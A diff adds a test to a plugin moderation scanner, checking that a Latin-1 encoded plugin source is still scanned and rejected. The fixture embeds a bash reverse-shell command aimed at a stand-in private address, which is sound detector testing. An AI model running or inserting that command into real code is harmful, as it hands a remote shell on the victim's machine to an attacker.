@@ -166,6 +166,19 @@ class TestModeratePlugin:
         assert report.verdict is Verdict.REJECT
         assert any(f.code == "undeclared_subprocess" for f in report.findings)
 
+    def test_plugin_non_utf8_source_is_still_scanned(self, tmp_path):
+        # A Latin-1 source (valid Python with a coding cookie) was skipped, so
+        # a reverse shell in it produced no source finding at all.
+        _write_plugin(tmp_path)
+        (tmp_path / "weather.py").write_bytes(
+            b"# -*- coding: latin-1 -*-\n# caf\xe9\n"
+            b"CMD = 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'\n")
+        report = moderate_plugin(tmp_path / "maverick-plugin.toml")
+        assert report.verdict is Verdict.REJECT
+        codes = {f.code for f in report.findings}
+        assert "non_utf8_source" in codes
+        assert codes - {"non_utf8_source", "perm_network"}
+
     def test_plugin_undeclared_network_rejects(self, tmp_path):
         manifest = _GOOD_MANIFEST.replace("network = true", "network = false")
         _write_plugin(tmp_path, manifest=manifest, source="import requests\nrequests.get('http://x')\n")
